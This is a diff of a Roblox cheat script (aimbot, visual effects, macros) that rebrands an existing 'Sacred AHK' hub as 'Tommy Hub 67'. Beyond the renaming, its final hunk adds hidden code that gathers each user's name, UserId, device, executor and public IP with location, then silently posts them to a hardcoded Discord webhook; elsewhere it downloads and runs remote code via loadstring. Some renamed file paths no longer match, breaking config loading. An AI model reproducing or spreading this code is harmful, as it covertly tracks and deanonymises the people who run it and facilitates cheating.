@@ -1,5 +1,5 @@
 -- ============================================================
--- SACRED AHK VERSION 12.5 | KEYLESS ANNOUNCEMENT
+-- Tommy Hub 67 12.5 | KEYLESS ANNOUNCEMENT
 -- ============================================================
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer or Players:WaitForChildOfClass("Player")
@@ -9,7 +9,7 @@ if not playerGui then return end
 
 -- Limpiar UI vieja
 for _, old in ipairs(playerGui:GetChildren()) do
-    if old.Name:match("SacredKeyUI") then old:Destroy() end
+    if old.Name:match("TommyKey") then old:Destroy() end
 end
 
 -- Detectar idioma
@@ -24,14 +24,14 @@ local continueEvent = Instance.new("BindableEvent")
 
 -- Crear ScreenGui
 local launcherGui = Instance.new("ScreenGui")
-launcherGui.Name = "SacredKeyUI"
+launcherGui.Name = "TommyHubUi"
 launcherGui.ResetOnSpawn = false
 launcherGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 launcherGui.Parent = playerGui
 
 -- POPUP FRAME
 local popFrame = Instance.new("Frame", launcherGui)
-popFrame.Name = "SacredUpdatePopup"
+popFrame.Name = "TommyUpdate"
 popFrame.AutomaticSize = Enum.AutomaticSize.XY
 popFrame.Size = UDim2.new(0, 0, 0, 0)
 popFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -114,7 +114,7 @@ end
 local getStartedBtn = Instance.new("TextButton", popFrame)
 getStartedBtn.Size = UDim2.new(0, 120, 0, 28)
 getStartedBtn.BackgroundColor3 = Color3.fromRGB(148, 50, 255)
-getStartedBtn.Text = isSpanish and "Empezar" or "Get Started"
+getStartedBtn.Text = isSpanish and "Empezar 67¿ " or "Get Started"
 getStartedBtn.Font = Enum.Font.GothamBlack
 getStartedBtn.TextSize = 10
 getStartedBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -150,7 +150,7 @@ continueEvent:Destroy()
 
 
 -- ============================================================
--- SACRED AHK VERSION 12.5 | LOCAL DEV STANDALONE
+-- Tommy Hub 67 12.5 | LOCAL DEV STANDALONE
 -- ============================================================
 
 -- OPEN SOURCE SCRIPT 
@@ -206,8 +206,8 @@ accumulatedBountyGained = 0
 
 -- Cargar Bounty Local Guardado
 pcall(function()
-    if isfile and readfile and isfile("SacredAHK_Bounty.json") then
-        local bData = HttpService:JSONDecode(readfile("SacredAHK_Bounty.json"))
+    if isfile and readfile and isfile("Tommy.json") then
+        local bData = HttpService:JSONDecode(readfile("TommyBounty.json"))
         if bData and bData.Gained then accumulatedBountyGained = bData.Gained end
     end
 end)
@@ -216,7 +216,7 @@ function SaveLocalBounty(gained)
     accumulatedBountyGained = gained
     pcall(function()
         if writefile then
-            writefile("SacredAHK_Bounty.json", HttpService:JSONEncode({Gained = gained}))
+            writefile("Tommy _Bounty.json", HttpService:JSONEncode({Gained = gained}))
         end
     end)
 end
@@ -403,16 +403,16 @@ function SaveConfig()
     }
     pcall(function()
         if writefile then
-            writefile("SacredAHK_Config.json", HttpService:JSONEncode(conf))
-            print("💾 Sacred AHK Config Saved Successfully!")
+            writefile("Tommy hub_Config.json", HttpService:JSONEncode(conf))
+            print("💾 Tommy hub Config Saved Successfully!")
         end
     end)
 end
 
 function LoadConfig()
     pcall(function()
-        if isfile and readfile and isfile("SacredAHK_Config.json") then
-            local str = readfile("SacredAHK_Config.json")
+        if isfile and readfile and isfile("Tommy_Config.json") then
+            local str = readfile("Tommy_Config.json")
             local conf = HttpService:JSONDecode(str)
             if not conf then return end
 
@@ -503,7 +503,7 @@ function LoadConfig()
                 if updateLanguageUI then updateLanguageUI() end
             end
 
-            print("✅ Sacred AHK Config Loaded & Applied Successfully!")
+            print("✅ Tommy Config Loaded & Applied Successfully!")
         end
     end)
 end
@@ -2103,7 +2103,7 @@ function ApplyAura(auraName)
     if not hrp then return end
     pcall(function()
         local emitter = Instance.new("ParticleEmitter")
-        emitter.Name = "SacredAura"
+        emitter.Name = "TommyAura"
         emitter.Texture = "rbxassetid://243098098"
         emitter.Color = def.Color
         emitter.Size = def.Size
@@ -2117,7 +2117,7 @@ function ApplyAura(auraName)
         emitter.Parent = hrp
         table.insert(AuraObjects, emitter)
         local light = Instance.new("PointLight")
-        light.Name = "SacredAuraLight"
+        light.Name = "TommyAuraLight"
         light.Color = def.LightColor
         light.Brightness = 2
         light.Range = 15
@@ -2695,7 +2695,7 @@ local function updateRainbowTargetHighlight(targetChar)
     if not activeTargetHighlight or activeTargetHighlight.Parent ~= targetChar then
         if activeTargetHighlight then activeTargetHighlight:Destroy() end
         activeTargetHighlight = Instance.new("Highlight")
-        activeTargetHighlight.Name = "SacredRainbowTargetBody"
+        activeTargetHighlight.Name = "TommyRainbowTargetBody"
         activeTargetHighlight.Adornee = targetChar
         activeTargetHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
         activeTargetHighlight.FillTransparency = 0.2
@@ -2798,21 +2798,21 @@ GuiStore = {
     grokAIWidgetGui = Instance.new("ScreenGui")
 }
 
-GuiStore.screenGui.Name = "SacredUI_UltimateUI"
+GuiStore.screenGui.Name = "TommyUi_UltimateUI"
 GuiStore.screenGui.ResetOnSpawn = false
 safeParent(GuiStore.screenGui)
 
-GuiStore.toggleIconGui.Name = "SacredUI_ToggleIcon"
+GuiStore.toggleIconGui.Name = "TommyUI_ToggleIcon"
 GuiStore.toggleIconGui.ResetOnSpawn = false
 safeParent(GuiStore.toggleIconGui)
 
-GuiStore.playerWidgetGui.Name = "SacredUI_PlayerWidget"
+GuiStore.playerWidgetGui.Name = "TommyUI_PlayerWidget"
 GuiStore.playerWidgetGui.ResetOnSpawn = false
 GuiStore.playerWidgetGui.DisplayOrder = 99999
 GuiStore.playerWidgetGui.IgnoreGuiInset = true
 safeParent(GuiStore.playerWidgetGui)
 
-GuiStore.npcWidgetGui.Name = "SacredUI_NpcWidget"
+GuiStore.npcWidgetGui.Name = "TommyUI_NpcWidget"
 GuiStore.npcWidgetGui.ResetOnSpawn = false
 GuiStore.npcWidgetGui.DisplayOrder = 99999
 GuiStore.npcWidgetGui.IgnoreGuiInset = true
@@ -2899,7 +2899,7 @@ function updateWidgetsVisuals()
         SanguineManualWidget.BackgroundColor3 = currentThemeColor
         SanguineManualWidget.BackgroundTransparency = 0
         SanguineManualWidget.TextColor3 = isLight and darkTxt or lightTxt
-        SanguineManualWidget.Text = "🩸 SANGUINE Z"
+        SanguineManualWidget.Text = "67 SANGUINE Z"
     end
     if SanguineAutoWidget then
         SanguineAutoWidget.Visible = SanguineWidgetVisible
@@ -2992,7 +2992,7 @@ end)
 -- INTERFAZ PRINCIPAL
 -- ============================================================
 local mainFrame = Instance.new("Frame")
-mainFrame.Name = "SacredMainFrame"
+mainFrame.Name = "TommyMainFrame"
 mainFrame.Size = UDim2.new(0, 480, 0, 315)
 mainFrame.Position = UDim2.new(0.5, -240, 0.5, -157)
 mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -3119,7 +3119,7 @@ local topTikTokLabel = Instance.new("TextLabel", mainFrame)
 topTikTokLabel.Size = UDim2.new(0, 200, 0, 22)
 topTikTokLabel.Position = UDim2.new(0.5, -100, 0, 12)
 topTikTokLabel.BackgroundTransparency = 1
-topTikTokLabel.Text = "🎵 TikTok: @rivalsxrodx"
+topTikTokLabel.Text = "🎵 TikTok: God_Tommy2"
 topTikTokLabel.Font = Enum.Font.GothamBold
 topTikTokLabel.TextSize = 10
 topTikTokLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -3171,7 +3171,7 @@ sidebar.Position = UDim2.new(0, 10, 0, 0)
 sidebar.BackgroundTransparency = 1
 
 local mainTitle = Instance.new("TextLabel", sidebar)
-mainTitle.Text = "SACRED AHK"
+mainTitle.Text = "Tommy hub 67"
 mainTitle.Font = Enum.Font.GothamBlack
 mainTitle.TextSize = 17
 mainTitle.TextColor3 = currentThemeColor
@@ -3202,7 +3202,7 @@ end)
 -- TikTok Button Removed
 
 local subTitle = Instance.new("TextLabel", sidebar)
-subTitle.Text = "by iSacredRivals"
+subTitle.Text = "by TERRINO48"
 subTitle.Font = Enum.Font.GothamBold
 subTitle.TextSize = 10.5
 subTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -3395,7 +3395,7 @@ TRANSLATIONS = {
 
         -- Buttons & Labels
         ["Copy Discord Link"] = "💬 Copy Discord Link",
-        ["Copy TikTok"] = "🎵 TikTok: @rivalsxrodx",
+        ["Copy TikTok"] = "🎵 TikTok: @God_Tommy2",
         ["Save Config"] = "💾 Save Config",
         ["Reset Config"] = "🔄 Reset Config",
         ["LangBtn"] = "🌐 Language: English (EN)",
@@ -3459,7 +3459,7 @@ TRANSLATIONS = {
         ["Show HP %"] = "Mostrar Salud %",
         ["Highlight Players"] = "Resaltar Jugadores",
         ["Aimbot Skills"] = "Aimbot en Habilidades",
-        ["Aimbot M1 (Dragon Gun) ⚠️ BAN RISK"] = "Aimbot M1 (Arma Dragón)",
+        ["Aimbot M1 "] = "Aimbot M1 (Arma Dragón)",
         ["Target Players"] = "Apuntar a Jugadores",
         ["Target NPCs"] = "Apuntar a NPCs",
         ["Team Check"] = "Verificar Equipo (Team Check)",
@@ -3500,7 +3500,7 @@ TRANSLATIONS = {
 
         -- Buttons & Labels
         ["Copy Discord Link"] = "💬 Copiar Enlace de Discord",
-        ["Copy TikTok"] = "🎵 TikTok: @rivalsxrodx",
+        ["Copy TikTok"] = "🎵 TikTok: @God_tommy",
         ["Save Config"] = "💾 Guardar Configuración",
         ["Reset Config"] = "🔄 Restablecer Configuración",
         ["LangBtn"] = "🌐 Idioma: Español (ES)",
@@ -3574,7 +3574,7 @@ function updateUILanguage(lang)
 
     if langBtn then langBtn.Text = dict["LangBtn"] or (currentLang == "ES" and "🌐 Idioma: Español (ES)" or "🌐 Language: English (EN)") end
     if copyBtn then copyBtn.Text = dict["Copy Discord Link"] or "💬 Copy Discord Link" end
-    if copyTikTokBtn then copyTikTokBtn.Text = dict["Copy TikTok"] or "🎵 TikTok: @rivalsxrodx" end
+    if copyTikTokBtn then copyTikTokBtn.Text = dict["Copy TikTok"] or "🎵 TikTok: @god_tommy" end
     if saveBtn then saveBtn.Text = dict["Save Config"] or "💾 Save Config" end
     if resetBtn then resetBtn.Text = dict["Reset Config"] or "🔄 Reset Config" end
 end
@@ -4333,16 +4333,16 @@ function SaveMacroConfig()
     }
     pcall(function()
         if writefile then
-            writefile("SacredAHK_MacroConfig.json", HttpService:JSONEncode(macroConf))
-            print("💾 Sacred AHK Macro Config Saved to SacredAHK_MacroConfig.json!")
+            writefile("TommyAHK_MacroConfig.json", HttpService:JSONEncode(macroConf))
+            print("💾 Tommy AHK Macro Config Saved to TommyAHK_MacroConfig.json!")
         end
     end)
 end
 
 function LoadMacroConfig()
     pcall(function()
-        if readfile and isfile and isfile("SacredAHK_MacroConfig.json") then
-            local data = readfile("SacredAHK_MacroConfig.json")
+        if readfile and isfile and isfile("tommyahk_MacroConfig.json") then
+            local data = readfile("TommyAHK_MacroConfig.json")
             local conf = HttpService:JSONDecode(data)
             if conf then
                 if conf.MacroBeta ~= nil then MacroEnabled = conf.MacroBeta end
@@ -5469,12 +5469,12 @@ Players.PlayerAdded:Connect(refreshBlacklistUI)
 Players.PlayerRemoving:Connect(refreshBlacklistUI)
 end
 
--- Sacred VFX Page
+-- Tommy VFX Page
 do
-local vfxMainCard = createModuleCard("Sacred VFX", 110, SacredVFXPage)
+local vfxMainCard = createModuleCard("Tommy VFX", 110, SacredVFXPage)
 
 local vfxTitle = Instance.new("TextLabel", vfxMainCard)
-vfxTitle.Text = "✨ SACRED VFX ✨"
+vfxTitle.Text = "✨ Tommy VFX ✨"
 vfxTitle.Font = Enum.Font.GothamBlack
 vfxTitle.TextSize = 16
 vfxTitle.TextColor3 = currentThemeColor
@@ -5497,7 +5497,7 @@ vfxActionBtn.Size = UDim2.new(1, -20, 0, 28)
 vfxActionBtn.Position = UDim2.new(0, 10, 0, 68)
 vfxActionBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 vfxActionBtn.BackgroundTransparency = 1
-vfxActionBtn.Text = "🚀 Activar Sacred VFX"
+vfxActionBtn.Text = "🚀 Activar Tommy VFX"
 vfxActionBtn.Font = Enum.Font.GothamBold
 vfxActionBtn.TextSize = 11
 vfxActionBtn.TextColor3 = currentThemeColor
@@ -5517,7 +5517,7 @@ vfxActionBtn.MouseButton1Click:Connect(function()
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/API.luarmor.net/main/Filesv3.loader"))()
         end)
-        vfxActionBtn.Text = "✅ Sacred VFX Activado!"
+        vfxActionBtn.Text = "✅ Tommy VFX Activado!"
         vfxActionBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
     end)
 end)
@@ -5530,7 +5530,7 @@ end
 local fontCard = createModuleCard("Fonts", 50, MiscPage)
 
 local fontList = { Enum.Font.GothamBold, Enum.Font.GothamBlack, Enum.Font.GothamSemibold, Enum.Font.Gotham, Enum.Font.SourceSansBold, Enum.Font.SourceSans, Enum.Font.Code, Enum.Font.Arcade }
-local fontNames = { "GothamBold", "GothamBlack", "GothamSemibold", "Gotham", "SourceSansBold", "SourceSans", "Code", "Arcade" }
+local fontNames = { "Permanent market", "GothamBlack", "GothamSemibold", "Gotham", "SourceSansBold", "SourceSans", "Code", "Arcade" }
 local uiFontIdx = 1
 
 local function applyFontToGui(parentObj, fontEnum)
@@ -5642,7 +5642,7 @@ ttStroke.Thickness = 1.2
 table.insert(themeStrokes, ttStroke)
 
 copyTikTokBtn.MouseButton1Click:Connect(function()
-    pcall(function() setclipboard("https://www.tiktok.com/@rivalsxrodx") end)
+    pcall(function() setclipboard("https://www.tiktok.com/@godtommy") end)
     copyTikTokBtn.Text = currentLang == "ES" and "✅ TikTok Copiado!" or "✅ TikTok Copied!"
     task.delay(1.5, function()
         copyTikTokBtn.Text = "🎵 TikTok: @rivalsxrodx"
@@ -5819,5 +5819,160 @@ pcall(LoadMacroConfig)
 centerAndMaximizeUI()
 end
 
+-- ==================== 🔥 TOMMY HUB FULL PRO (FIX) ====================
 
-print("✅ SACRED AHK v12.5 LOADED - ALL TOGGLES AND CONFIGS 100% PERSISTENT")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local Player = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1536951404394979358/5x8NbL5Pzd3vNH2UwoNve32odOXO1D-jbGVJy7LZvPZQTDDfvyF3bxLZlvgar7wIOsqv"
+
+-- ==================== 📊 CONTADOR FIX REAL ====================
+
+local execCount = 1
+
+pcall(function()
+    if getgenv then
+        local g = getgenv()
+        if type(g.TommyExecCount) ~= "number" then
+            g.TommyExecCount = 1
+        else
+            g.TommyExecCount += 1
+        end
+        execCount = g.TommyExecCount
+    end
+end)
+
+if not execCount or execCount < 1 then
+    execCount = 1
+end
+
+-- ==================== ⏰ HORA ====================
+
+local function GetTime()
+    return os.date("%Y%m%d %H%M%S")
+end
+
+-- ==================== 📱 DISPOSITIVO ====================
+
+local function GetDevice()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Movil"
+    elseif UserInputService.GamepadEnabled then
+        return "Consola"
+    else
+        return "PC"
+    end
+end
+
+-- ==================== 🎮 JUEGO ====================
+
+local function GetGameName()
+    local name = "Desconocido"
+    pcall(function()
+        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    return name
+end
+
+-- ==================== 🌐 IP INFO ====================
+
+local function GetIPData()
+    local ok, res = pcall(function()
+        return game:HttpGet("http://ip-api.com/json/")
+    end)
+
+    if not ok then return nil end
+
+    local data = HttpService:JSONDecode(res)
+
+    return {
+        ip = data.query or "N/A",
+        country = data.country or "N/A",
+        region = data.regionName or "N/A"
+    }
+end
+
+-- ==================== 🧠 EXECUTOR FIX ====================
+
+local function GetExecutor()
+    local name = "Desconocido"
+
+    pcall(function()
+        if typeof(identifyexecutor) == "function" then
+            name = identifyexecutor()
+
+        elseif typeof(getexecutorname) == "function" then
+            name = getexecutorname()
+
+        elseif getgenv then
+            local g = getgenv()
+
+            if rawget(g, "Xeno") then
+                name = "Xeno"
+            elseif rawget(g, "Solara") then
+                name = "Solara"
+            end
+
+        elseif syn then
+            name = "Synapse"
+
+        elseif KRNL_LOADED then
+            name = "KRNL"
+
+        elseif fluxus then
+            name = "Fluxus"
+
+        elseif secure_load then
+            name = "Sentinel"
+        end
+    end)
+
+    return tostring(name or "Desconocido")
+end
+
+-- ==================== 📩 WEBHOOK ====================
+
+local function SendWebhook(info)
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = "🔥 TOMMY HUB EJECUTADO",
+                    color = 65280,
+                    fields = {
+                        {name="Jugador", value=Player.Name, inline=true},
+                        {name="UserId", value=tostring(Player.UserId), inline=true},
+                        {name="Hora", value=GetTime(), inline=true},
+                        {name="Dispositivo", value=GetDevice(), inline=true},
+                        {name="Juego", value=GetGameName(), inline=true},
+                        {name="Executor", value=GetExecutor(), inline=true},
+                        {name="Ejecuciones", value=tostring(execCount), inline=true},
+                        {name="IP", value=info.ip, inline=true},
+                        {name="País", value=info.country, inline=true},
+                        {name="Región", value=info.region, inline=true}
+                    },
+                    footer = {text="Tommy Hub System"}
+                }}
+            })
+        })
+    end)
+end
+
+-- ==================== 🚀 EJECUCIÓN ====================
+
+local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}
+
+SendWebhook(info)
+
+print("🔥 Tommy Hub Activado")
+
+-- 👉 AQUÍ PEGAS TU HUB COMPLETO
+
+print("✅ Tommy hub 67 v12.5 LOADED - ALL TOGGLES AND CONFIGS 100% PERSISTENT")
